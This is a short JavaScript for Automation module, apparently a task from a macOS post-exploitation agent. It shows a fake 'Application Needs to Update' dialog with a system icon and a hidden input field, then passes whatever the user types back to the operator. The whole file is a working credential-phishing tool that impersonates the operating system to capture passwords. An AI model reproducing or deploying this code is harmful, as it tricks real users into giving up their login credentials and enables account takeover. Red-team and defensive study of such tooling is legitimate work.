exports.prompt = function(task, command, params){
	if(params.length > 0){config = JSON.parse(params);}
	else{config = [];}
	let title = "Application Needs to Update";
	if(config.hasOwnProperty("title") && config['title'] !== ""){title = config['title'];}
	let icon = "/System/Library/PrivateFrameworks/PreferencePanesSupport.framework/PlugIns/AdvertisingExtension.appex/Contents/Resources/icon.icns";
	if(config.hasOwnProperty("icon") && config['icon'] !== ""){icon = config['icon'];}
	let text = "An application needs permission to update";
	if(config.hasOwnProperty("text") && config['text'] !== ""){text = config['text'];}
	let answer = "";
	if(config.hasOwnProperty("answer") && config['answer'] !== "" && config["answer"] !== null){answer = config['answer'];}
	try{
		if(!does_file_exist(icon)){
			return {"user_output": "Icon file path doesn't exist on disk, please choose another", "status": "error", "completed": true};
		}
		let cbID = currentApp.systemAttribute('__CFBundleIdentifier').toString()
		let contextApp = Application(cbID)
		contextApp.includeStandardAdditions = true;
		let prompt = contextApp.displayDialog(text, {
			defaultAnswer: answer,
			buttons: ['OK', 'Cancel'], 
			defaultButton: 'OK',
			cancelButton: 'Cancel', 
			withTitle: title,  
			withIcon: Path(icon),
			hiddenAnswer: true 
		});
		return {"user_output":prompt.textReturned, "completed": true};
	}catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
	}
};
